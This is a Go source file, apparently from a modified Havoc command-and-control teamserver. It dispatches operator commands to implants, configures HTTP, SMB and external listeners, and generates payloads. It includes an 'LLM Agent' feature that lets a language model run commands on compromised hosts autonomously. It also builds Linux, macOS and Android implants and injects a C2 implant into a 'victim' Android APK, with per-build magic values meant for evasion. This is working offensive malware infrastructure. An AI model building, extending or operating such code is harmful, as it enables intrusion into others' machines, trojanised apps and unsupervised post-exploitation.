package server

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/agent"
	"Havoc/pkg/common/builder"
	"Havoc/pkg/events"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"
	llmPkg "Havoc/pkg/llm"
	"Havoc/pkg/packager"
	"Havoc/pkg/utils"
)

func (t *Teamserver) DispatchEvent(pk packager.Package) {
	switch pk.Head.Event {

	case packager.Type.Session.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Session.MarkAsDead:
			if AgentID, ok := pk.Body.Info["AgentID"]; ok {
				for i := range t.Agents.Agents {
					if t.Agents.Agents[i].NameID == AgentID {

						if val, ok := pk.Body.Info["Marked"]; ok {
							if val == "Dead" {
								t.Died(t.Agents.Agents[i])
							} else if val == "Alive" {
								t.Agents.Agents[i].Active = true
							}
							t.AgentUpdate(t.Agents.Agents[i])
						}
					}
				}
			}

			break

		case packager.Type.Session.Input:
			var (
				job       *agent.Job
				command   = 0
				AgentType = "Demon"
				err       error
				DemonID   string
				found     = false
			)

			if agentID, ok := pk.Body.Info["DemonID"].(string); ok {
				DemonID = agentID
			} else {
				logger.Debug("AgentID [" + agentID + "] not found")
				return
			}

			for i := range t.Agents.Agents {

				if t.Agents.Agents[i].NameID == DemonID {
					found = true

					// handle demon session input
					// TODO: maybe move to own function ?
					// Accept both the default DEADBEEF magic (Windows Demon) AND any
					// custom magic (POSIX agents that use per-build random magic for evasion).
					// Only skip to the service-agent path if this magic is registered as a
					// service agent — otherwise treat as a standard Demon.
					isPosixOrDemon := t.Agents.Agents[i].Info.MagicValue == agent.DEMON_MAGIC_VALUE ||
						!t.ServiceAgentExist(t.Agents.Agents[i].Info.MagicValue)
					if isPosixOrDemon {

						var (
							Message = new(map[string]string)
							Console = func(AgentID string, Message map[string]string) {
								var (
									out, _ = json.Marshal(Message)
									pk     = events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE, string(out))
								)

								t.EventAppend(pk)
								t.EventBroadcast("", pk)
							}
						)

						if val, ok := pk.Body.Info["CommandID"]; ok {

							// ── LLM Agent command ──────────────────────────────────
							if pk.Body.Info["CommandID"] == "LLM Agent" {
								goal, _ := pk.Body.Info["Goal"].(string)
								agentInstance := t.Agents.Agents[i]

								// Send echo to all clients
								echoBackups := map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "LLM Agent",
									"CommandLine": "llm \"" + goal + "\"",
									"AgentType":   AgentType,
								}
								for k := range pk.Body.Info { delete(pk.Body.Info, k) }
								pk.Body.Info = echoBackups
								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								// Run the LLM agent in a goroutine so the server stays responsive
								go func() {
									// Resolve LLM config
									if t.Profile.Config.LLM == nil {
										var errPk = events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE,
											`{"Type":"Error","Message":"[LLM] No LLM config in profile. Add an LLM {} block to havoc.yaotl","Output":""}`)
										t.EventAppend(errPk); t.EventBroadcast("", errPk)
										return
									}
									cfg := t.Profile.Config.LLM
									maxSteps := cfg.MaxSteps; if maxSteps <= 0 { maxSteps = 20 }
									maxTokens := cfg.MaxTokens; if maxTokens <= 0 { maxTokens = 4096 }

									provider, err := llmPkg.NewProvider(cfg.Provider, cfg.ApiKey, cfg.Model, cfg.BaseUrl)
									if err != nil {
										var errPk = events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE,
											`{"Type":"Error","Message":"[LLM] Provider error: `+err.Error()+`","Output":""}`)
										t.EventAppend(errPk); t.EventBroadcast("", errPk)
										return
									}

									// Output function — streams LLM progress to all clients
									outputFn := func(msgType, message string) {
										msg := map[string]string{"Type": msgType, "Message": message, "Output": ""}
										msgJson, _ := json.Marshal(msg)
										outPk := events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE, string(msgJson))
										t.EventAppend(outPk)
										t.EventBroadcast("", outPk)
									}

									// Execute function — tasks the agent and waits for output
									executeFn := func(command string) (string, error) {
										return t.LLMExecuteCommand(agentInstance, command, outputFn)
									}

									agentCfg := llmPkg.AgentConfig{
										Provider:  provider,
										MaxSteps:  maxSteps,
										MaxTokens: maxTokens,
										Goal:      goal,
										AgentOS:   agentInstance.Info.OSVersion,
										AgentUser: agentInstance.Info.Username,
										AgentHost: agentInstance.Info.Hostname,
									}

									llmPkg.Run(agentCfg, executeFn, outputFn)
								}()
								return
							}

							if pk.Body.Info["CommandID"] == "Python Plugin" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": pk.Body.Info["CommandLine"].(string),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
									backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
								}

								for k := range pk.Body.Info {
									delete(pk.Body.Info, k)
								}

								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								return

							} else if pk.Body.Info["CommandID"] == "Teamserver" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

								var Command = pk.Body.Info["Command"].(string)

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": pk.Body.Info["CommandLine"].(string),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								for k := range pk.Body.Info {
									delete(pk.Body.Info, k)
								}

								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								if err = t.Agents.Agents[i].TeamserverTaskPrepare(Command, Console); err != nil {
									Console(t.Agents.Agents[i].NameID, map[string]string{
										"Type":    "Error",
										"Message": "Failed to create Task: " + err.Error(),
									})
									return
								}

								return

							} else {

								// TODO: move to own function.
								command, err = strconv.Atoi(val.(string))
								if err != nil {

									logger.Error("Failed to convert CommandID to integer: " + err.Error())
									command = 0

								} else {
									*Message = make(map[string]string)

									var ClientID string
									ClientID = ""
									t.Clients.Range(func(key, value any) bool {
										client := value.(*Client)
										if client.Username == pk.Head.User {
											ClientID = client.ClientID
											return false
										}
										return true
									})

									job, err = t.Agents.Agents[i].TaskPrepare(command, pk.Body.Info, Message, ClientID, t)
									if err != nil {
										Console(t.Agents.Agents[i].NameID, map[string]string{
											"Type":    "Error",
											"Message": "Failed to create Task: " + err.Error(),
										})
										return
									}

									if job != nil {
										t.Agents.Agents[i].AddJobToQueue(*job)
									}

									if t.Agents.Agents[i].Pivots.Parent != nil {
										logr.LogrInstance.AddAgentInput("Demon", t.Agents.Agents[i].NameID, pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

									} else {
										logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))
									}

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      pk.Body.Info["TaskID"].(string),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": pk.Body.Info["CommandLine"].(string),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									for k := range pk.Body.Info {
										delete(pk.Body.Info, k)
									}

									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									if Message != nil {
										Console(t.Agents.Agents[i].NameID, *Message)
									}

									return
								}
							}
						}

					} else {

						for _, a := range t.Service.Agents {
							if a.MagicValue == fmt.Sprintf("0x%x", t.Agents.Agents[i].Info.MagicValue) {

								// Set agent type
								AgentType = a.Name

								if pk.Body.Info["CommandID"] == "Python Plugin" {
									logr.LogrInstance.AddAgentInput(AgentType, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      pk.Body.Info["TaskID"].(string),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": pk.Body.Info["CommandLine"].(string),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
										backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
									}

									for k := range pk.Body.Info {
										delete(pk.Body.Info, k)
									}

									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									return

								} else {
									// Send command to agent service
									a.SendTask(pk.Body.Info, t.Agents.Agents[i].ToMap())

									// log agent input
									logr.LogrInstance.AddAgentInput(a.Name, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))
								}

							}
						}
					}
					break
				}
			}

			if found == false {
				logger.Error(fmt.Sprintf("The AgentID %s was not found", DemonID))
				return
			}

			if pk.Head.OneTime == "true" {
				return
			}

			var backups = map[string]interface{}{
				"TaskID":      pk.Body.Info["TaskID"].(string),
				"DemonID":     DemonID,
				"CommandID":   "",
				"CommandLine": pk.Body.Info["CommandLine"].(string),
				"AgentType":   AgentType,
			}

			if _, ok := pk.Body.Info["CommandID"].(string); ok {
				backups["CommandID"] = pk.Body.Info["CommandID"]
			}

			for k := range pk.Body.Info {
				delete(pk.Body.Info, k)
			}

			pk.Body.Info = backups

			t.EventAppend(pk)
			t.EventBroadcast(pk.Head.User, pk)
		}

	case packager.Type.Chat.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Chat.NewMessage:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewSession:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewListener:
			t.EventBroadcast("", pk)
			break

		}

	case packager.Type.Listener.Type:
		switch pk.Body.SubEvent {

		case packager.Type.Listener.Add:

			var Protocol = pk.Body.Info["Protocol"].(string)

			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:

				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = pk.Body.Info["HostBind"].(string)

				for _, s := range strings.Split(pk.Body.Info["Hosts"].(string), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         pk.Body.Info["Name"].(string),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: pk.Body.Info["HostRotation"].(string),
					PortBind:     pk.Body.Info["PortBind"].(string),
					PortConn:     pk.Body.Info["PortConn"].(string),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   pk.Body.Info["HostHeader"].(string),
					UserAgent:    pk.Body.Info["UserAgent"].(string),
					BehindRedir:  t.Profile.Config.Demon.TrustXForwardedFor,
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if pk.Body.Info["Secure"].(string) == "true" {
					Config.Secure = true
				}

				if err := t.ListenerStart(handlers.LISTENER_HTTP, Config); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_PIVOT_SMB:
				var (
					SmdConfig handlers.SMBConfig
					found     bool
				)

				SmdConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				SmdConfig.PipeName, found = pk.Body.Info["PipeName"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				if err := t.ListenerStart(handlers.LISTENER_PIVOT_SMB, SmdConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_EXTERNAL:
				var (
					ExtConfig handlers.ExternalConfig
					found     bool
				)

				ExtConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					ExtConfig.Name = ""
				}

				ExtConfig.Endpoint, found = pk.Body.Info["Endpoint"].(string)
				if !found {
					logger.Error("Listener SMB Pivot: Endpoint not specified")
					return
				}

				if err := t.ListenerStart(handlers.LISTENER_EXTERNAL, ExtConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			default:

				// check if the service endpoint is up and available
				if t.Service != nil {

					for _, listener := range t.Service.Listeners {

						if Protocol == listener.Name {

							var (
								ListenerName string
								err          error
							)

							// retrieve the listener name
							if val, ok := pk.Body.Info["Name"]; ok {
								ListenerName = val.(string)
							}

							// try to start the listener.
							if err = listener.Start(pk.Body.Info); err != nil {
								t.EventListenerError(ListenerName, err)
							}

							// append the listener to the teamserver listener array
							t.Listeners = append(t.Listeners, &Listener{
								Name: ListenerName,
								Type: handlers.LISTENER_SERVICE,
								Config: handlers.Service{
									Service: listener,
									Info:    pk.Body.Info,
								},
							})

							// break from this switch
							return
						}

					}

				}

				// didn't found the protocol type so just abort
				logger.Error("Listener Type not found: ", Protocol)

				break
			}

			break

		case packager.Type.Listener.Remove:

			if val, ok := pk.Body.Info["Name"]; ok {
				t.ListenerRemove(val.(string))

				var p = events.Listener.ListenerRemove(val.(string))

				t.EventAppend(p)
				t.EventBroadcast("", p)
			}

			break

		case packager.Type.Listener.Edit:

			var Protocol = pk.Body.Info["Protocol"].(string)
			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:
				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = pk.Body.Info["HostBind"].(string)

				for _, s := range strings.Split(pk.Body.Info["Hosts"].(string), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         pk.Body.Info["Name"].(string),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: pk.Body.Info["HostRotation"].(string),
					PortBind:     pk.Body.Info["PortBind"].(string),
					PortConn:     pk.Body.Info["PortConn"].(string),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   pk.Body.Info["HostHeader"].(string),
					UserAgent:    pk.Body.Info["UserAgent"].(string),
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if pk.Body.Info["Secure"].(string) == "true" {
					Config.Secure = true
				}

				t.ListenerEdit(handlers.LISTENER_HTTP, Config)

				var p = events.Listener.ListenerEdit(handlers.LISTENER_HTTP, &Config)

				t.EventAppend(p)
				t.EventBroadcast("", p)

				break

			}

			break
		}

	case packager.Type.Gate.Type:

		switch pk.Body.SubEvent {
		case packager.Type.Gate.Stageless:
			var (
				AgentType      = pk.Body.Info["AgentType"].(string)
				ListenerName   = pk.Body.Info["Listener"].(string)
				Arch           = pk.Body.Info["Arch"].(string)
				Format         = pk.Body.Info["Format"].(string)
				Config         = pk.Body.Info["Config"].(string)
				SendConsoleMsg func(MsgType, Message string)
				ClientID       string
			)

			t.Clients.Range(func(key, value any) bool {
				Client := value.(*Client)
				if Client.Username == pk.Head.User {
					ClientID = Client.ClientID
					return false
				}
				return true
			})

			SendConsoleMsg = func(MsgType, Message string) {
				err := t.SendEvent(ClientID, events.Gate.SendConsoleMessage(MsgType, Message))
				if err != nil {
					logger.Error("Couldn't send Event: " + err.Error())
					return
				}
			}

			if AgentType == "DemonPosix" {
				// ── POSIX / Android agent builder ─────────────────────────────
				go func() {
					// Resolve listener C2 params
					var (
						c2Host string
						c2Port int
						c2Uri  string
						c2Ssl  bool
						c2UA   string
					)
					if info := t.ListenerGetInfo(ListenerName); info != nil {
						if h, ok := info["Hosts"]; ok {
							switch v := h.(type) {
							case string:
								if parts := strings.SplitN(v, ",", 2); len(parts) > 0 {
									c2Host = strings.TrimSpace(parts[0])
								}
							case []string:
								if len(v) > 0 { c2Host = v[0] }
							}
						}
						if p, ok := info["PortConn"]; ok {
							switch v := p.(type) {
							case string:  fmt.Sscanf(v, "%d", &c2Port)
							case int:     c2Port = v
							case float64: c2Port = int(v)
							}
						}
						if c2Port == 0 {
							if p, ok := info["PortBind"]; ok {
								switch v := p.(type) {
								case string:  fmt.Sscanf(v, "%d", &c2Port)
								case int:     c2Port = v
								case float64: c2Port = int(v)
								}
							}
						}
						if u, ok := info["Uris"]; ok {
							switch v := u.(type) {
							case string:
								if parts := strings.SplitN(v, ",", 2); len(parts) > 0 {
									c2Uri = strings.TrimSpace(parts[0])
								}
							case []string:
								if len(v) > 0 { c2Uri = v[0] }
							}
						}
						if s, ok := info["Secure"]; ok {
							switch v := s.(type) {
							case bool:   c2Ssl = v
							case string: c2Ssl = (v == "true")
							}
						}
						if ua, ok := info["UserAgent"]; ok {
							if v, ok := ua.(string); ok { c2UA = v }
						}
					}
					if c2Uri == "" { c2Uri = "/" }

					// Extract optional PackageName / AppLabel from Config JSON
					// (shared by both Android APK and Android APK Inject)
					var cfgPkgName, cfgAppLabel string
					if Config != "" {
						var cfgMap map[string]interface{}
						if err := json.Unmarshal([]byte(Config), &cfgMap); err == nil {
							if v, ok := cfgMap["PackageName"].(string); ok && v != "" {
								cfgPkgName = v
							}
							if v, ok := cfgMap["AppLabel"].(string); ok && v != "" {
								cfgAppLabel = v
							}
						}
					}

					// Android APK — separate builder
					if Format == "Android APK" {
						ab := builder.NewAndroidBuilder(builder.AndroidBuilderConfig{
							DebugDev: t.Flags.Server.DebugDev,
						})
						ab.SendConsoleMessage = SendConsoleMsg
						ab.Host = c2Host
						ab.Port = c2Port
						ab.Uri  = c2Uri
						ab.Ssl  = c2Ssl
						if c2UA != ""      { ab.UserAgent   = c2UA }
						if cfgPkgName != "" { ab.PackageName = cfgPkgName }
						if cfgAppLabel != "" { ab.AppLabel   = cfgAppLabel }
						if ab.Build() {
							data, err := os.ReadFile(ab.OutputPath)
							if err == nil && len(data) > 0 {
								_ = t.SendEvent(ClientID, events.Gate.SendStageless("demon.apk", data))
							}
							os.RemoveAll(ab.CompileDir)
						}
						return
					}

					// Android APK Inject — repackage an existing victim APK
					if Format == "Android APK Inject" {
						// Config JSON must contain "SourceApk" as base64-encoded APK bytes
						var cfgMap map[string]interface{}
						if err := json.Unmarshal([]byte(Config), &cfgMap); err != nil {
							SendConsoleMsg("Error", "Invalid config JSON: "+err.Error())
							return
						}
						srcB64, ok := cfgMap["SourceApk"].(string)
						if !ok || srcB64 == "" {
							SendConsoleMsg("Error", "No victim APK provided (SourceApk missing in config)")
							return
						}
						apkBytes, err := base64.StdEncoding.DecodeString(srcB64)
						if err != nil {
							SendConsoleMsg("Error", "SourceApk base64 decode failed: "+err.Error())
							return
						}

						// Write victim APK to a temp file
						victimPath := "/tmp/havoc_victim_" + utils.GenerateID(8) + ".apk"
						if err := os.WriteFile(victimPath, apkBytes, 0644); err != nil {
							SendConsoleMsg("Error", "Failed to write victim APK: "+err.Error())
							return
						}
						defer os.Remove(victimPath)

						ai := builder.NewApkInjector(builder.ApkInjectorConfig{
							DebugDev: t.Flags.Server.DebugDev,
						})
						ai.SendConsoleMessage = SendConsoleMsg
						ai.Host          = c2Host
						ai.Port          = c2Port
						ai.Uri           = c2Uri
						ai.Ssl           = c2Ssl
						if c2UA != ""       { ai.UserAgent   = c2UA }
						if cfgPkgName != "" { ai.PackageName = cfgPkgName }
						ai.VictimApkPath = victimPath

						if ai.Inject() {
							data, err := os.ReadFile(ai.OutputPath)
							if err == nil && len(data) > 0 {
								_ = t.SendEvent(ClientID, events.Gate.SendStageless("injected.apk", data))
							}
							os.RemoveAll(ai.CompileDir)
						}
						return
					}

					// All other POSIX targets
					pb := builder.NewPosixBuilder(builder.PosixBuilderConfig{
						DebugDev: t.Flags.Server.DebugDev,
						SendLogs: t.Flags.Server.SendLogs,
					})
					pb.SendConsoleMessage = SendConsoleMsg
					pb.Host      = c2Host
					pb.Port      = c2Port
					pb.Uri       = c2Uri
					pb.Ssl       = c2Ssl
					pb.UserAgent = c2UA

					switch Arch {
					case "arm64": pb.Arch = builder.ARCHITECTURE_ARM64
					default:      pb.Arch = builder.ARCHITECTURE_X64
					}

					var Ext string
					switch Format {
					case "Linux Exe":
						pb.Target = builder.POSIX_TARGET_LINUX_EXE
						Ext = ".linux.elf"
					case "Linux SO":
						pb.Target = builder.POSIX_TARGET_LINUX_SO
						Ext = ".linux.so"
					case "macOS Exe":
						pb.Target = builder.POSIX_TARGET_MACOS_EXE
						Ext = ".macos"
					case "macOS Dylib":
						pb.Target = builder.POSIX_TARGET_MACOS_DYLIB
						Ext = ".macos.dylib"
					case "Android Exe":
						pb.Target = builder.POSIX_TARGET_ANDROID_EXE
						Ext = ".android.elf"
					case "Android SO":
						pb.Target = builder.POSIX_TARGET_ANDROID_SO
						Ext = ".android.so"
					default:
						pb.Target = builder.POSIX_TARGET_LINUX_EXE
						Ext = ".linux.elf"
					}

					if pb.Build() {
						data, err := os.ReadFile(pb.OutputPath)
						if err == nil && len(data) > 0 {
							err = t.SendEvent(ClientID, events.Gate.SendStageless("demon_posix"+Ext, data))
							if err != nil {
								logger.Error("Error sending DemonPosix payload: " + err.Error())
							}
						}
						os.RemoveAll(pb.CompileDir)
					}
				}()
			} else if AgentType == "Demon" {
				go func() {
					var ConfigMap = make(map[string]any)

					err := json.Unmarshal([]byte(Config), &ConfigMap)
					if err != nil {
						logger.Error("Failed to Unmarshal json to object: " + err.Error())
						return
					}

					var PayloadBuilder = builder.NewBuilder(builder.BuilderConfig{
						Compiler64: t.Settings.Compiler64,
						Compiler86: t.Settings.Compiler32,
						Nasm:       t.Settings.Nasm,
						DebugDev:   t.Flags.Server.DebugDev,
						SendLogs:   t.Flags.Server.SendLogs,
					})

					PayloadBuilder.ClientId = ClientID

					if PayloadBuilder.ClientId == "" {
						logger.Error("Couldn't find the Client")
						return
					}

					PayloadBuilder.SendConsoleMessage = SendConsoleMsg

					err = PayloadBuilder.SetConfig(Config)
					if err != nil {
						return
					}

					if Arch == "x64" {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X64)
					} else {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X86)
					}

					var Ext string
					if Arch == "x64" {
						Ext = ".x64"
					} else {
						Ext = ".x86"
					}
					logger.Debug(Format)
					if Format == "Windows Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_EXE)
						Ext += ".exe"
					} else if Format == "Windows Service Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_SERVICE_EXE)
						Ext += ".exe"
					} else if Format == "Windows Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_DLL)
						Ext += ".dll"
					} else if Format == "Windows Reflective Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_REFLECTIVE_DLL)
						Ext += ".dll"
					} else if Format == "Windows Shellcode" {
